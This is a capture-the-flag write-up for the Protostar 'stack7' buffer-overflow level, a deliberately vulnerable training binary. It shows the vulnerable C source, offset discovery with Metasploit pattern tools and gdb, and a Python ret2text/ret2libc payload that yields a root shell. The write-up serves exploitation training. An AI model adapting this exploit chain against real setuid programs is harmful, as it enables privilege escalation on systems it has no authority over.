#### Stack7

###### About

- Stack6 introduces return to ``.text`` to gain code execution.
- The metasploit tool ``msfelfscan`` can make searching for suitable instructions very easy, otherwise looking through ``objdump`` output will suffice.
- This level is at ``/opt/protostar/bin/stack7``
- **``ret2text``**

``stack7.c``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./stack7
input path please: AAAA
got path AAAA
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*100"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./stack7
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
user@protostar:/opt/protostar/bin$
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
root@kali:~#
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r
Starting program: /opt/protostar/bin/stack7
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37634136
[*] Exact match at offset 80
root@kali:~#
```

``/tmp/buf.py``

```python
import struct

buf = "A" * 80
buf += struct.pack("<I",0xd3adc0d3)

print buf
```

```sh
user@protostar:/tmp$ python buf.py > out
```

```sh
user@protostar:/tmp$ cat out
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
user@protostar:/tmp$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r < /tmp/out
Starting program: /opt/protostar/bin/stack7 < /tmp/out
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA����

Program received signal SIGSEGV, Segmentation fault.
0xd3adc0d3 in ?? ()
(gdb)
```

```sh
user@protostar:/opt/protostar/bin$ objdump -d stack7 -M intel | grep ret
 8048383:	c3                   	ret
 8048494:	c3                   	ret
 80484c2:	c3                   	ret
 8048544:	c3                   	ret
 8048553:	c3                   	ret
 8048564:	c3                   	ret
 80485c9:	c3                   	ret
 80485cd:	c3                   	ret
 80485f9:	c3                   	ret
 8048617:	c3                   	ret
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r
Starting program: /opt/protostar/bin/stack7
input path please: AAAA
got path AAAA

Program exited with code 010.
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb)
```

```sh
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc.so.6 | grep /bin/sh
 11f3bf /bin/sh
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) set disassembly-flavor intel
(gdb) break *getpath
Breakpoint 1 at 0x80484c4: file stack7/stack7.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack7

Breakpoint 1, getpath () at stack7/stack7.c:7
7	stack7/stack7.c: No such file or directory.
	in stack7/stack7.c
(gdb) info proc map
process 1967
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
	0xb7e96000 0xb7e97000     0x1000          0
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0
	0xb7fe0000 0xb7fe2000     0x2000          0
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) x/s 0xb7e97000+0x0011f3bf
0xb7fb63bf:	 "/bin/sh"
(gdb)
```

``/tmp/buf.py``

```python
import struct

padding = "A" * 80
ret_address = struct.pack("I",0x08048544)
system_address = struct.pack("I",0xb7ecffb0)
exit_address = struct.pack("I",0xb7ec60c0)
bin_sh_address = struct.pack("I", 0xb7fb63bf)

print padding + ret_address + system_address + exit_address + bin_sh_address
```

```sh
user@protostar:/opt/protostar/bin$ (python /tmp/buf.py;cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD����`췿c�
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
^C
user@protostar:/opt/protostar/bin$
```
